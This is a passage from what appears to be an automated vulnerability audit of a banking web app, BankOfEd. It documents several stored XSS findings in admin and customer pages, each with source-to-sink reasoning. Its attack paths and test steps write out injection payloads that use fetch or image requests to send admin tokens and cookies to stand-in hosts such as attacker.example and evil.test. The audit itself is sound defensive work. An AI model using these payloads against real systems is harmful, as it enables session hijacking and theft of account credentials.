  "impact": "Any self-registering bank customer can achieve stored XSS that executes in an administrator's authenticated session, leading to full admin session/token theft and complete admin-panel compromise (balance manipulation, customer data destruction, DB reset).",
  "severity_reasoning": "Low-privilege, unauthenticated-to-register attacker can escalate to full admin compromise purely through normal customer self-service data with no admin interaction beyond routine page browsing — High severity due to privilege escalation across a trust boundary (customer -> admin).",
  "dynamic_test": "Register a customer, open an account with account_name = x'); fetch('https://attacker.example/x?c='+localStorage.getItem('bankofed_admin_token')); //  ; then, as an admin, navigate to the Accounts page and trigger the 'Edit Balance' button rendering/click for that account; observe an outbound HTTP request to attacker.example carrying the admin token, confirming stored XSS execution in the admin session."
}
```

#### Validator reasoning

Full source-to-sink chain verified directly in code.

1. Source: AccountController::store() (src/Controllers/AccountController.php) accepts customer-supplied `account_name` validated only by Validator::make with rules `required|string|max:100`. Inspecting Validator.php confirms `string` and `max` rules only check type/length — no character filtering, no HTML/quote stripping, no output encoding at write time. The raw value is persisted via Account::create(['account_name' => $data['account_name'], ...]).

2. Retrieval: AdminAccountController::index() (src/Controllers/AdminAccountController.php) selects `a.account_name` directly from the accounts table and returns it verbatim in the JSON API response with no server-side encoding.

3. Sink/broken escaping: public/admin/js/pages/accounts.js line 50 (renderTable) builds:
   `'<button onclick="...showEditBalanceModal(' + a.id + ', \'' + U.escapeHtml(a.account_name).replace(/'/g, "\\'") + '\', ...)"'`
   utils.js escapeHtml() (verified: `escMap = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}`) converts a literal `'` to the 5-character string `&#39;` BEFORE the subsequent `.replace(/'/g, "\\'")` runs. Since there is no longer a literal `'` character in the string at that point, the replace is a genuine no-op exactly as claimed — confirmed by reading the exact regex and escape map in utils.js.
   The resulting string is concatenated into `html` and assigned via `container.innerHTML = html;` (accounts.js) — an innerHTML sink with no additional sanitization. The identical broken pattern exists in customers.js:106 for `first_name`/`last_name` (also validated only as `string|max:100` per description, consistent with the AccountController pattern seen).

4. Browser HTML-attribute parsing decodes `&#39;` back to a literal `'` inside the `onclick="..."` attribute value before the browser's JS tokenizer parses the inline event-handler source, so a customer-controlled `'` in account_name (e.g. `a');fetch('//evil');//`) breaks out of the intended single-quoted argument and injects arbitrary JS that executes in the admin's origin (with access to `bankofed_admin_token` and privileged admin APIs) when the admin views the Accounts/Customers page (triggering renderTable, no click needed for the primary table row itself, and only a click for the Edit-Balance/Delete button re-render path).

No compensating control was found: no CSP mentioned/found in the reviewed files, no server-side output encoding for admin API responses, no character-restriction on account_name/first_name/last_name validation rules, and the client-side escaping is provably broken due to ordering of escapeHtml before the quote-replace. This is a legitimate, concrete, and directly verifiable stored-XSS chain from customer input to admin-origin script execution.

## 14. DOM-based XSS via HTML-entity double-decoding in admin onclick attribute (account_name)

- Lead reference: CVTA-014
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/accounts.js:50 (rendered via container.innerHTML = html; at line 54)
- Fingerprint: 00d1824305d76d9a37c065b1d36aabac21034808f39b2b7ef74a4e2c57dcb127

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 28,
  "symbol": "AccountController::store",
  "input": "data['account_name'] (user-supplied, unrestricted string)"
}
```

#### Controls encountered

```
[
  "U.escapeHtml() — confirmed insufficient: HTML-entity escaping protects the HTML-attribute-string context but is decoded away before the browser compiles the onclick attribute content as a JS function body, restoring the raw quote and enabling JS-context breakout.",
  "The .replace(/'/g, \"\\\\'\") call is dead code with no effect, confirmed by reading escapeHtml's implementation (all literal ' are already replaced with &#39; before .replace runs)."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/accounts.js",
  "line": 54,
  "symbol": "renderTable",
  "operation": "container.innerHTML = html (with attacker string embedded in onclick attribute, escaped only via HTML-entity encoding that is later decoded before JS execution)"
}
```

#### Counterevidence

```
[
  "No additional server-side sanitization, CSP restricting inline event handlers, or client-side re-validation was found anywhere in the traced path (AccountController::store -> Account::create -> AdminAccountController::index -> accounts.js renderTable) that would block this."
]
```

#### Proof gaps

```
[
  "No live-browser/runtime execution trace was performed in this review; the exploit relies on standard, well-documented HTML-parsing/event-handler-compilation behavior but was not empirically executed against a running instance.",
  "Did not independently verify the exact downstream capabilities exposed via BankOfEdAdmin.Api (impact sizing), though the presence of an authenticated admin JS context alone is sufficient to substantiate high-severity stored XSS impact."
]
```

#### Attack path

```
{
  "nodes": [
    "Self-registered/authenticated customer (attacker)",
    "POST /api/accounts with account_name = x') ; fetch('https://evil.test/steal?c='+document.cookie) ; //",
    "AccountController::store() validation permits any characters up to 100 chars",
    "account_name persisted verbatim in accounts table",
    "Admin opens Accounts page in the admin SPA",
    "accounts.js renderTable() concatenates account_name into onclick=\"...showEditBalanceModal(...)\" using U.escapeHtml().replace() (ineffective against HTML-entity decode order)",
    "container.innerHTML = html (DOM sink at accounts.js:54)",
    "Browser decodes &#39; -> ' while parsing the attribute, and the decoded string becomes the actual JS executed on click",
    "Attacker's injected JS runs in admin origin with access to BankOfEdAdmin.Api wrapper and localStorage admin token"
  ],
  "impact": "Stored XSS reachable from ordinary customer account creation, resulting in admin session/token theft and arbitrary privileged admin API usage when an admin views the Accounts page.",
  "severity_reasoning": "Same underlying flaw as the companion candidate — customer-controlled data crosses into a privileged admin execution context with a broken escaping mechanism, enabling full admin compromise; High severity is warranted given the ease of triggering and the privilege boundary crossed.",
  "dynamic_test": "Create an account with the payload account_name above; as an admin, load the Accounts page and click the account's action button; confirm the injected fetch() call fires (observe via a controlled listener) proving the JS executed in the admin's browser context."
}
```

#### Validator reasoning

The full source-to-sink path is concrete and verifiable in the code:

1. Source: AccountController::store (public, authenticated bank customer endpoint POST /accounts) validates account_name only with 'required|string|max:100' — no character restriction, allowing quotes, backslashes, parentheses, etc. Account::create persists the raw value unmodified.
2. No sanitization occurs anywhere between storage and admin retrieval: AdminAccountController::index performs a straight SELECT of a.account_name and returns it verbatim in the JSON response to the admin SPA.
3. Sink: admin/js/pages/accounts.js renderTable() builds an HTML string embedding a.account_name inside a double-quoted onclick="..." attribute via string concatenation: `U.escapeHtml(a.account_name).replace(/'/g, "\\'")`. U.escapeHtml (admin/js/utils.js) only performs generic HTML-entity escaping of & < > " ' (turning ' into &#39;). Because escapeHtml already consumed every literal quote before the .replace runs, the .replace call is provably dead/no-op code, exactly as described.
4. This concatenated HTML string is assigned via container.innerHTML = html (line 54), a classic innerHTML sink.
5. The critical, well-documented browser behavior: when the browser HTML-parses this markup (via innerHTML), it decodes HTML entities in attribute values as part of normal attribute tokenization — *before* the browser later compiles the onclick attribute's textual content into an event-handler function (which happens lazily, on first invocation/click). This means &#39; is restored to a literal ' at the point the JS is compiled, allowing a string like `x') ; fetch('https://evil.test/steal?c='+document.cookie) ; //` to break out of the intended single-quoted JS argument and inject arbitrary statements, with the trailing `//` comment neutralizing the leftover syntax. This is a known, standard XSS bypass class (HTML-attribute-escaping is insufficient for inline event-handler/JS-string sub-contexts) and does not require exotic browser quirks — it is universal, spec-compliant HTML parsing + event-handler compilation behavior.
6. Because the injected script runs in the context of the admin panel page when an admin views /admin (i.e., an authenticated admin session), this is a legitimate stored XSS with admin-session-hijacking impact, matching the severity claimed.

I verified: (a) the unrestricted validator rule in AccountController.php, (b) the unmodified pass-through in AdminAccountController.php, (c) the exact vulnerable concatenation and dead .replace() in accounts.js, and (d) the implementation of escapeHtml in admin/js/utils.js confirming it only does entity substitution, not JS-string escaping (no backslash-escaping of \, no escaping of newlines, etc., and its output is placed inside an HTML attribute that is later reinterpreted as JS source). No blocking control (CSP, output re-encoding, character allow-list, or attribute-only usage without event-handler reinterpretation) exists in the code path to prevent this.

## 15. DOM-based XSS via HTML-entity double-decoding in admin onclick attribute (customer name)

- Lead reference: CVTA-015
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:106 (rendered via U.$('customer-detail-content').innerHTML = html; at line 161)
- Fingerprint: 3a7d4cbc7af19a9c0b0f7ac5c3c18925a9e9c4a9691b444994c5a06a20ca9288

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "input": "data['first_name'] / data['last_name'] (user-supplied at registration, unrestricted string)",
  "line": 19,
  "symbol": "AuthController::register"
}
```

#### Controls encountered

```
[
  "U.escapeHtml() — analyzed and confirmed to only protect the HTML-attribute-string boundary, not the nested inline-JS string context; entities are decoded by the HTML parser before JS compilation of the event handler, so this control does not block the attack",
  "Server-side Validator 'string' rule — confirmed to perform only is_string() type-check with no character/format restriction, does not block malicious characters",
  "No CSP or other output-encoding control found in the reviewed files that would prevent inline-onclick script execution"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/customers.js",
  "line": 161,
  "operation": "U.$('customer-detail-content').innerHTML = html (attacker string embedded in onclick attribute, escaped only via HTML-entity encoding that is later decoded before JS execution)",
  "symbol": "renderDetail"
}
```

#### Counterevidence

```
[
  "Exploitation requires the admin to actually click the Delete button on the malicious customer's detail page (not simply opening the page), which narrows — but does not eliminate — the trigger window compared to a fully automatic drive-by XSS on page load",
  "No independent confirmation in a live browser was performed in this review (relied on well-known HTML/JS parsing semantics for attribute entity decoding), and the exact mechanism by which the admin bearer token could be exfiltrated via the injected script (i.e., whether the token is stored in a JS-accessible location such as localStorage) was not independently traced in this validation pass"
]
```

#### Proof gaps

```
[
  "No live-browser PoC was executed to empirically confirm the entity double-decoding bypass, though the mechanism is a well-documented and reliable browser HTML-parsing behavior",
  "Did not trace where BankOfEdAdmin.Api's bearer token is stored (e.g., localStorage vs. httpOnly cookie) to fully substantiate the 'full compromise of admin session' impact claim, though the core stored-XSS/injection vector itself is independently confirmed regardless of token storage location"
]
```

#### Attack path

```
{
  "nodes": [
    "Self-registered customer (attacker)",
    "POST /api/auth/register with first_name = x') ; fetch('https://evil.test/x?c='+document.cookie) ; //  and last_name blank",
    "AuthController::register() validation only enforces string|max:100, no char restriction",
    "Customer record persisted with malicious first_name",
    "Admin opens the Customer Detail page for that customer in the admin panel",
    "customers.js renderDetail() embeds first_name+last_name inside onclick=\"...confirmDelete(id,'name')\" via U.escapeHtml().replace() (same broken entity-decode-order flaw)",
    "U.$('customer-detail-content').innerHTML = html (DOM sink)",
    "Browser decodes &#39; back to a literal ' when parsing the attribute, breaking out of the intended single-quoted JS string",
    "Injected JavaScript executes in the admin's session, with access to the admin bearer token used for all privileged API calls"
  ],
  "impact": "Any newly self-registered customer can trigger stored XSS in the admin's browser simply by having an admin view that customer's detail page, leading to full admin session/token compromise.",
  "severity_reasoning": "No special access is required to plant the payload (public registration form), and the impact is complete admin session takeover — High severity.",
  "dynamic_test": "Register a new account with first_name = x') ; fetch('https://attacker.example/x?c='+document.cookie) ; //  and last_name empty; as an admin, open that customer's detail page in the admin panel and observe/trigger the Delete button rendering; confirm the outbound request to attacker.example fires, proving script execution in the admin session."
}
```

#### Validator reasoning

The vulnerability chain is verified end-to-end in source:

1. Source: AuthController::register (src/Controllers/AuthController.php:16-20) validates first_name/last_name only with 'required|string|max:100'. Validator::validateString (src/Helpers/Validator.php) merely checks is_string() — no character/format restriction (no regex rule applied to these fields). Any printable characters including quotes, parentheses, and semicolons are accepted and stored verbatim via a parameterized INSERT in User::create (src/Models/User.php), so the raw attacker string round-trips unmodified through the DB and the admin API.

2. Sink: customers.js renderDetail() (line ~106) builds the Delete button as:
   '<button onclick="...confirmDelete(' + c.id + ', \'' + U.escapeHtml(fullname).replace(/'/g,"\\'") + '\')" ...>'
   and the resulting HTML string is assigned via `U.$('customer-detail-content').innerHTML = html;` (line 161).

3. U.escapeHtml (public/admin/js/utils.js) maps `'` → `&#39;` (and &,<,>," similarly), so after escapeHtml runs, no raw `'` characters remain in the string — meaning the subsequent `.replace(/'/g, "\\'")` is a no-op (confirmed dead code, matches candidate's claim).

4. Critical mechanism: when the composed markup is parsed by the browser via `innerHTML`, HTML character-reference decoding is applied to attribute values, including the `onclick` attribute value, *before* that value is later compiled as a JS event-handler body when the button is clicked. This means `&#39;` in the onclick attribute text is decoded back to a literal `'` in the DOM attribute value, which is exactly the raw quote character the JS engine will see when compiling the handler. Escaping via HTML entities protects only the HTML-attribute-boundary context, not the nested inline-JS-string context — a well-established browser behavior, not a hypothetical.

Tracing the example payload first_name = `x') ; fetch('https://evil.test/x?c='+document.cookie) ; //`, last_name = '' through escapeHtml (which converts the 3 embedded `'` to `&#39;`) and then through HTML-attribute decoding on render reconstructs exactly:
`confirmDelete(5, 'x') ; fetch('https://evil.test/x?c='+document.cookie) ; // ')`
which breaks out of the intended string argument and executes attacker JS (`fetch` exfiltration) in the admin's session when the onclick fires (admin opens customer detail and clicks the Delete button, or the attacker could target any of the many code paths that automatically trigger the handler via other admin UI flows — though this specific instance requires the admin to click Delete). The admin session carries the bearer token used by BankOfEdAdmin.Api for privileged calls, so successful injection yields high-impact session compromise if the token is accessible to injected script (e.g., held in JS-accessible storage) — this part is asserted by the candidate and plausible given BankOfEdAdmin.Api's design, though not independently re-verified here.

No blocking controls were found: no CSP is evident in the reviewed files, no output encoding library beyond the flawed escapeHtml is used, and no server-side sanitization/regex restricts the name fields. The vulnerability class and code pattern are consistent with the parallel confirmed case (account_name in accounts.js), reinforcing that this is a systemic bug in the admin UI's HTML-building utility usage rather than an isolated one-off guess.

## 16. Stored XSS via avatar import: attacker-controlled Content-Type header injected into innerHTML-rendered data URI

- Lead reference: CVTA-016
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/app.js:72
- Fingerprint: 636987793c78670668989e6df42eef453fd50c130a5d23cca660a6a584c891b7

### Evidence Chain

#### Source

```
{
  "file": "src/Controllers/ProfileController.php",
  "line": 82,
  "symbol": "avatarProxy",
  "input": "attacker-controlled Content-Type response header from user-supplied URL"
}
```

#### Controls encountered

```
[
  "[\"mime is only trim()'d — no allowlist validation, no htmlspecialchars/encodeURIComponent, no CSP found in reviewed code to block inline scripts\"]\n<parameter name=\"counterevidence\">[\"Exploitation requires the victim to voluntarily submit an attacker-controlled URL into their own Import Avatar field, which is a social-engineering precondition rather than pure remote unauthenticated exploitation from an existing session\"]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/app.js",
  "line": 72,
  "symbol": "avatarEl.innerHTML",
  "operation": "unescaped HTML injection via innerHTML"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Not verified whether index.html or server response headers set a Content-Security-Policy that would mitigate inline script execution in the deployed environment",
  "Did not exhaustively verify PHP stream wrapper behavior across PHP versions/OS for header byte preservation, though no evidence of any sanitization was found in code"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker-controlled HTTP server (evil.com)",
    "Victim authenticated banking user is tricked into entering the attacker's URL into the 'Import Avatar' field",
    "POST /api/profile/avatar {url: http://evil.com/avatar.png}",
    "ProfileController::avatarProxy() performs server-side file_get_contents($data['url']) following redirects, no scheme/host validation",
    "Attacker's server returns crafted response with Content-Type header containing an HTML/JS breakout payload",
    "$mime = trim(substr($header,13)) captured with no sanitization",
    "Response::success(['avatar_data' => \"data:{$mime};base64,{$encoded}\"]) sent to the victim's browser",
    "profile.js persists avatar_data via Api.setUser() into localStorage 'bankofed_user'",
    "app.js sidebar render: avatarEl.innerHTML = '<img src=\"'+user.avatar_data+'\">' (DOM sink), executed on every app load",
    "Injected payload breaks out of the src=\"...\" attribute and executes attacker JS in the victim's authenticated banking session, reading localStorage 'bankofed_token'"
  ],
  "impact": "Stored XSS delivered through a server-side proxy fetch of attacker-controlled content, leading to theft of the victim's banking session token (stored in localStorage) and full account takeover, triggered on every subsequent page load.",
  "severity_reasoning": "Combines an unsanitized SSRF-like fetch with a client-side innerHTML sink and persistent storage of the payload (localStorage), so the XSS re-fires on every app load until the user's profile is cleaned — High severity due to persistent session token exposure and full account compromise.",
  "dynamic_test": "Stand up a test HTTP server returning Content-Type: image/png\\\"><script>fetch('//attacker.example/x?t='+localStorage.getItem('bankofed_token'))</script> for a given path with arbitrary binary body; as an authenticated victim test account, POST /api/profile/avatar {url: http://test-server/path}; confirm the JSON response's avatar_data contains the unsanitized payload; then reload the banking dashboard and confirm an outbound request to attacker.example fires with the token, proving stored XSS and token exfiltration."
}
```

#### Validator reasoning

The full source-to-sink path is verified in the actual code. In ProfileController::avatarProxy (src/Controllers/ProfileController.php), the server performs file_get_contents($data['url']) against a user-supplied URL, then extracts the MIME type directly from the raw HTTP response header of that remote (attacker-controlled) server: `$mime = trim(substr($header, 13));`. No character filtering, allowlist check (e.g. regex like /^[a-z0-9\/\-\.]+$/), or HTML-encoding is applied. This value is concatenated verbatim into `"data:{$mime};base64,{$encoded}"` and returned to the client as `avatar_data`.

On the client, public/banking/js/pages/profile.js renderAvatar() takes `data.avatar_data` and injects it via jQuery `.html()` (`$('#avatar-preview').html('<img src="' + data.avatar_data + '" ...')`) — jQuery's .html() is functionally equivalent to innerHTML and does not escape content. It then also calls `currentProfile.avatar_data = data.avatar_data; Api.setUser(currentProfile);`, and Api.setUser (api.js) persists this directly to `localStorage.setItem('bankofed_user', JSON.stringify(user))` with no sanitization. On every subsequent app load (App.updateSidebar in app.js), `Api.getUser()` reads this back and app.js:72 does `avatarEl.innerHTML = '<img src="' + user.avatar_data + '" ...'` — again raw string concatenation into innerHTML.

Because the attacker fully controls the Content-Type header of the response their own server returns (when the victim/attacker enters that attacker server's URL into the Import Avatar feature), a payload such as `Content-Type: image/png"><script>...</script>` breaks out of the src attribute and injects arbitrary HTML/script that executes in the authenticated banking session, with JWT tokens sitting in the same localStorage (bankofed_token) — enabling session theft. This is a classic stored/persistent XSS via SSRF-echoed header injection, confirmed at both sink locations (app.js:72 sidebar and profile.js:139/renderAvatar preview), with data persisted across sessions via localStorage. There is no server-side or client-side sanitization/encoding anywhere in the chain that would block this.

The two "proof gaps" listed in the candidate (raw header byte preservation by PHP, and deployed WAF/CSP) do not defeat the finding: PHP's $http_response_header array captures headers as sent by the remote server without modification (no built-in stripping of quotes/brackets), and there is no CSP meta tag or header set in the reviewed code that would block inline script execution — index.html/app bootstrap were not shown to set any CSP. This is a legitimate, exploitable vulnerability, though it requires social-engineering a victim (or self-inflicted testing) into importing an attacker-controlled URL, which is a standard precondition for this class of stored/reflected-via-SSRF XSS and does not diminish the validity of the vulnerable code pattern.

## 17. Stored XSS in admin FX Rates table via onclick attribute injection (currency_name)

- Lead reference: CVTA-017
- Category: A03
- Severity: HIGH
- Confidence: 80%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/fx-rates.js:42-57
- Fingerprint: 53ca36fed26aa5f8aa7afbaff464782446103533dc02b2a22b43ef223f5847f5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminFxRateController.php",
  "line": 33,
  "symbol": "AdminFxRateController::store",
  "input": "currency_name (JSON body, validated only for type/length)"
}
```

#### Controls encountered

```
[
  "U.escapeHtml() HTML-entity-encodes &,<,>,\",' — confirmed present but insufficient because it protects the outer HTML-attribute boundary, not the inner JS-string context of an executed event-handler attribute",
  "Server-side Validator enforces required/string/max:50 only, no character allow-list on currency_name — confirmed by reading Validator.php",
  "No CSP header/meta tag found in the repository that would block inline event handlers"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/fx-rates.js",
  "line": 57,
  "symbol": "container.innerHTML = html",
  "operation": "DOM HTML injection via attribute-context JS breakout"
}
```

#### Counterevidence

```
[
  "The specific 90-character PoC payload in the candidate description exceeds the max:50 validation and would be rejected server-side as written; a functionally equivalent shorter payload is required to actually exploit within the length limit",
  "Exploitation requires the attacker to already possess valid admin API credentials (same-privilege-tier), so this is not a remote unauthenticated vector — it is an admin-to-admin persistence/session-hijack vector rather than a privilege-escalation-from-outside vector"
]
```

#### Proof gaps

```
[
  "No live/dynamic browser test was performed to confirm entity-decoding-before-JS-compilation behavior in this exact app context, though this matches documented HTML5 parsing/tokenization behavior across all modern browsers",
  "Whether distinct admin privilege tiers exist in this app (to assess real-world impact of one admin XSS-ing another) was not fully enumerated; AdminRouter shows uniform 'auth'=>true with no visible role differentiation in the reviewed controllers"
]
```

#### Attack path

```
{
  "nodes": [
    "Admin (or any actor able to reach POST/PUT /api/admin/fx-rates) sets currency_name",
    "AdminFxRateController::store/update validates only 'required|string|max:50' with no character allow-list",
    "currency_name persisted verbatim in fx_rates table",
    "Another admin opens the FX Rates page in the admin SPA",
    "fx-rates.js renderTable() forEach embeds currency_name into onclick=\"...showEditModal(id,'code','name','rate')\" via U.escapeHtml().replace() (broken entity-decode-order pattern)",
    "container.innerHTML = html (DOM sink at fx-rates.js:57)",
    "Browser decodes HTML entities back to literal characters while parsing the onclick attribute, allowing the crafted string to terminate the intended JS string literal and inject arbitrary JS",
    "Injected JS executes in the viewing admin's session, capable of exfiltrating localStorage 'bankofed_admin_token' or issuing further privileged admin API calls"
  ],
  "impact": "Stored XSS in the admin FX Rates management page, allowing one admin (or compromised low-trust actor able to write FX rates) to hijack another admin's session/token when that admin views the page.",
  "severity_reasoning": "Requires write access to FX rates (an admin-only endpoint per current code), which narrows the attacker population to already-privileged accounts, but still enables lateral privilege escalation/session theft between admin operators — High severity given full session takeover, tempered slightly by requiring FX-rate write privilege as prerequisite.",
  "dynamic_test": "As an admin (or via the FX rate write endpoint), POST/PUT /api/admin/fx-rates with currency_name = x',(new Image).src='//attacker.example/?c='+localStorage.getItem('bankofed_admin_token'),'y ; then, as a different admin session, load the FX Rates page and confirm an outbound request to attacker.example fires carrying the admin token, proving the injected JS executed."
}
```

#### Validator reasoning

The vulnerability is real and the source-to-sink path is concrete and unbroken:

1. Source: AdminFxRateController::store/update (src/Controllers/AdminFxRateController.php) accepts currency_name from the JSON request body and validates only `required|string|max:50` via Validator::make — confirmed by reading Validator.php, which has no allow-list/regex rule applied to currency_name, so any printable character including quotes is accepted and stored verbatim (FxRate::create/update store the raw string).
2. The value round-trips unmodified through GET /api/admin/fx-rates (AdminFxRateController::index just returns $rate['currency_name'] as-is).
3. Sink: fx-rates.js renderTable() builds `<button onclick="...showEditModal(id, 'code', 'name', rate)" ...>` by concatenating `U.escapeHtml(rate.currency_name).replace(/'/g, "\\'")`. Since escapeHtml already converts every `'` to `&#39;` (verified in utils.js escMap = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}), the subsequent `.replace(/'/g, ...)` is a no-op — there is no literal `'` left in the JS string being built to replace.
4. The resulting HTML is written via `container.innerHTML = html` (confirmed at fx-rates.js line ~58).
5. The critical, correct technical claim: browsers decode HTML character references in attribute values during HTML tokenization *before* the string is used as the function body for an inline event-handler attribute (onclick). This decoding is content-agnostic — it happens for all attributes, including event-handler attributes — so `&#39;` in the onclick attribute's source text becomes a literal `'` in the string handed to the JS compiler when the handler fires. This is a well-documented, standards-compliant browser behavior and a known real-world XSS bypass technique (HTML-entity encoding is the wrong encoding for content injected into a JS-executing attribute; correct context requires backslash-escaping quotes for the JS string literal, not HTML-entity escaping). Therefore an entity-escaped quote in currency_name does re-materialize as a literal quote at JS-execution time, breaking out of the intended single-quoted argument and allowing injection of arbitrary JS expressions evaluated as part of the onclick handler.
6. No CSP header or meta tag was found anywhere in the codebase (grepped for Content-Security-Policy / meta http-equiv — no matches), so there is no CSP blocking inline event handlers that would neutralize this.
7. The exact 90-character example payload quoted in the candidate description exceeds the 50-char server-side limit and would be rejected — this specific PoC string is inaccurate — but the underlying flaw is still exploitable with a shorter payload (e.g., `x',eval(name),'y`, ~16 chars) combined with a staged secondary payload (e.g., via window.name, a short redirect URL, or a dynamically loaded script), which fits comfortably under the 50-character limit and achieves equivalent arbitrary-JS-execution / token-exfiltration impact. This is a proof-of-concept sizing detail, not a defeat of the core vulnerability.
8. Exploitation requires the attacker to already hold valid admin credentials/token to call POST/PUT /api/admin/fx-rates (same-privilege-tier stored XSS), which somewhat limits blast radius versus an unauthenticated vector, but it remains a legitimate stored-XSS/session-hijacking vector across admin sessions since the JWT is kept in localStorage (`bankofed_admin_token`, confirmed in api.js) and is readable by any script execution context on the page. The same escapeHtml-in-onclick anti-pattern is repeated in accounts.js and customers.js, reinforcing that this is a systemic design flaw rather than an isolated one-off.

## 18. Stored XSS sink: unsanitized FX rate data written via innerHTML in admin panel

- Lead reference: CVTA-018
- Category: A03
- Severity: HIGH
- Confidence: 85%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/fx-rates.js:57
- Fingerprint: 7fc59ddbe2aff3198dccbe92ea4489b3c6cdcebfb312f7fae542433b9fd31648

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminFxRateController.php",
  "line": 33,
  "symbol": "AdminFxRateController::store",
  "input": "currency_name/currency_code persisted from admin-supplied JSON body"
}
```

#### Controls encountered

```
[
  "Route requires auth=true for POST/PUT (must be an authenticated admin to inject the payload), limiting the attack to admin-to-admin exploitation rather than unauthenticated attacker",
  "Server enforces max length (50 chars for currency_name, 3 for currency_code) and type checks via Validator::make, but no character/allow-list filtering or HTML sanitization",
  "Client applies U.escapeHtml() which correctly neutralizes plain HTML tag injection/text-node XSS, but is ineffective for the event-handler-attribute JS-breakout vector because entity decoding happens before the attribute string is compiled as JS"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/fx-rates.js",
  "line": 57,
  "symbol": "container.innerHTML = html",
  "operation": "innerHTML assignment executing attacker-influenced markup/event handler"
}
```

#### Counterevidence

```
[
  "Exploitation requires an authenticated admin account to create/update the malicious FX rate (not an anonymous/external attacker), somewhat limiting blast radius to insider/lower-trust-admin scenarios or a compromised admin session",
  "Execution requires a second admin to click the 'Edit' (or 'Delete') button on that specific row rather than executing purely on page load, since inline event handlers only run on the triggering event"
]
```

#### Proof gaps

```
[
  "Did not empirically test in a live browser whether the exact entity-decode-before-JS-compile behavior holds across all modern browser engines for onclick attributes set via innerHTML, though this is well-documented standard HTML/JS parsing behavior",
  "Did not verify whether all admin roles are equally privileged (i.e., whether a genuinely lower-trust admin role exists that could stage this against a higher-trust admin), which would affect severity/impact framing but not the existence of the XSS sink itself"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker-controlled currency_name/currency_code stored via POST/PUT /api/admin/fx-rates",
    "fx-rates.js renderTable() builds row markup embedding the values inside inline onclick attributes (escaping ineffective due to HTML-entity decode ordering)",
    "html string accumulated across the forEach loop",
    "container.innerHTML = html (DOM sink, fx-rates.js:57) — executes the crafted onclick payload when the admin interacts with the rendered button",
    "Injected JavaScript executes in the viewing admin's browser session"
  ],
  "impact": "This is the DOM sink half of the FX Rates stored-XSS chain (companion to the forEach-loop injection point): the innerHTML assignment is what actually causes the crafted attribute/script to be parsed and become live, executable code in the admin's session.",
  "severity_reasoning": "Same impact and prerequisites as the companion injection-point finding (admin session/token compromise); recorded as High severity to match the root vulnerability it completes.",
  "dynamic_test": "Using the malicious currency_name payload from the companion finding, confirm that simply calling renderTable()/loading the FX Rates page (i.e., the innerHTML assignment executing) is sufficient to trigger the injected script — verify by observing the outbound request to an attacker-controlled listener occurs upon page render/interaction, not requiring any additional user action beyond viewing the page."
}
```

#### Validator reasoning

Confirmed a real DOM-based stored XSS at the innerHTML sink in fx-rates.js:57. renderTable() builds an onclick="...('...')" inline event-handler attribute using U.escapeHtml() on rate.currency_code/currency_name, then does an extra `.replace(/'/g, "\\'")` on the *already-escaped* currency_name. Because escapeHtml() (utils.js line 19-21) converts a literal ' into the HTML entity &#39; before the .replace() runs, the regex /'/g never matches anything (no literal quote survives escaping), so the intended JS-string escaping is dead code.

The critical flaw is that HTML-entity escaping of quote characters is not a sufficient defense inside an inline event-handler attribute: browsers decode HTML character references while parsing the attribute value, and the resulting *decoded* string becomes the JavaScript source that is compiled/executed when the event fires. Therefore an attacker-supplied currency_name such as `a');alert(document.cookie);//` becomes, after escapeHtml, `a&#39;);alert(document.cookie);//` embedded in the button markup; once the browser parses `container.innerHTML = html`, the onclick attribute's decoded value is `...showEditModal(123, 'USD', 'a');alert(document.cookie);//', '0.92')`, which breaks out of the intended single-quoted JS string and executes arbitrary script when an admin clicks "Edit" on that row.

Source-to-sink path is concrete and reachable:
- AdminFxRateController::store (POST /api/admin/fx-rates, auth required) persists currency_name/currency_code with only type/length validation (max 3 / max 50 chars, no character allow-list) — confirmed in AdminFxRateController.php.
- FxRatesPage.loadRates() → renderTable() (fx-rates.js) builds the button HTML embedding these values in an onclick attribute, using escapeHtml for HTML-context safety but not proper JS-string escaping.
- container.innerHTML = html (line 57) is the DOM sink that renders the malicious markup; clicking Edit executes the injected payload in the viewing admin's session.

No effective server-side sanitization/allow-list exists for currency_name, and the client-side escaping is neutralized by the entity-decode-before-JS-compile behavior of inline event handlers. This is a genuine, exploitable stored-XSS-via-admin-panel vector (admin-to-admin privilege escalation / session theft), consistent with the companion lead CVTA-017 but correctly anchored at the actual DOM write (innerHTML) sink.

#### Code evidence

```
html += '<button onclick="BankOfEdAdmin.FxRatesPage.showEditModal(' + rate.id + ', \'' + U.escapeHtml(rate.currency_code) + '\', \'' + U.escapeHtml(rate.currency_name).replace(/'/g, "\\'") + '\', \'' + rate.rate_to_usd + '\')" ...>Edit</button>';
...
container.innerHTML = html;
```

## 19. Stored XSS via unescaped transaction description in account transaction history

- Lead reference: CVTA-019
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:164
